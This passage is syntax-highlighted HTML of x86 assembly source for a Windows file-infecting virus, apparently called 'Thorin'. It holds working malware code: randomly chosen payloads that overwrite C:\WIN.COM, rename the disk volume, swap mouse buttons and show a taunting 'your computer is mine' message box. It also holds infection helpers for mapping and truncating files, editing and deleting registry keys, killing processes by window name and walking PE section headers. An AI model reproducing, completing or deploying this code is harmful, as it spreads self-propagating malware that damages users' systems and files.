    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempGA_IT2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">wegotit</span><span class="sc0">
</span><span class="sc5">reloop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loopy</span><span class="sc0">
</span><span class="sc5">wegotit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B1h</span><span class="sc0">
</span><span class="sc5">nopes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetAPI_IT</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Payloads</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; White trash get down on your knees... and you'll get cake and sodomy!</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetTickCount</span><span class="sc0">                   </span><span class="sc1">; Get a random payload</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">payload_number</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">payload_table</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Call to it</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">payload</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">payload1</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">                       </span><span class="sc1">; Mmm, a new win.com :)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000080h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000002h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">___</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"C:\WIN.COM"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">___</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">p_size</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">payl0ad</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">payload1</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">payload2</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"THORIN"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; HD Name is... THORIN :)</span><span class="sc0">
</span><span class="sc5">__</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetVolumeLabelA</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">payload2</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">payload3</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SwapMouseButton</span><span class="sc0">                </span><span class="sc1">; Left is right, right is left</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">payload3</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">payload4</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00001010h</span><span class="sc0">                       </span><span class="sc1">; Display message</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vname</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_2</span><span class="sc0">

</span><span class="sc1">; Stupid message to annoy user... panic ain't good, but... what is good? ;)</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Thorin... Thorin... Thorin... Thorin... Thorin..."</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"I am Thorin, son of Thrain, son of Thror"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"and your computer is mine... mwahahahahaha!"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"I will give you... the death you deserve!"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"...Thorin ...Thorin ...Thorin ...Thorin ...Thorin"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_MessageBoxA</span><span class="sc0">
</span><span class="sc5">payload4</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">payload5</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szSHELL32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_LoadLibraryA</span><span class="sc0">                   </span><span class="sc1">; Get SHELL32 base address</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@ShellExecuteA</span><span class="sc4">]</span><span class="sc0">        
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc0">                 </span><span class="sc1">; Get ShellExecuteA address</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szMicro$oft</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szOPEN</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Open Micro$oft web</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">payload5</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Some miscellaneous functions</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; ALIGN</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX = Number to align</span><span class="sc0">
</span><span class="sc1">;       ECX = Alignment factor</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Aligned number</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">Align</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc9">Align</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; TRUNCFILE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ECX = Where trunc file</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">TruncFile</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFilePointer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetEndOfFile</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TruncFile</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; OPENFILE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to file</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Handle (if succesful) / -1 (if failed)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">OpenFile</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OpenFile</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; CREATEMAP</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ECX = Size to map</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Handle (if succesful) / 0 (if failed)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">CreateMap</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000004h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileMappingA</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CreateMap</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; MAPFILE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ECX = Size to map</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Handle (if succesful) / 0 (if failed)</span><span class="sc0">

</span><span class="sc5">MapFile</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F001Fh</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_MapViewOfFile</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MapFile</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; REGEXIST</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to key name</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       CF  = Set to 1 if it exist, to 0 if it doesn't</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">RegExist</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F003Fh</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000001h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_RegOpenKeyExA</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">RegExistExitCF0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RegExistExitCF0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RegExist</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; PUTREG</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to key name</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">PutReg</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Disposition</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F003Fh</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000001h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_RegCreateKeyExA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PutReg</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; DELREG</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to key name</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">DelReg</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000001h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_RegDeleteKeyA</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DelReg</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; TERMINATEPROC</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EDI = Pointer to the name of the window of the process we wanna kill</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       CF  = Set to 1 if it wasn't found or killed, to 0 if it was killed</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">TerminateProc</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">; Thnx 2 Bennyg0d :)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindWindowA</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TP_ErrorExit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000012h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_PostMessageA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">TP_ErrorExit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TerminateProc</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; GETLASTSECTION</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to PE header</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to last section</span><span class="sc0">
</span><span class="sc1">;       EDI = Pointer to PE header</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetLastSection</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
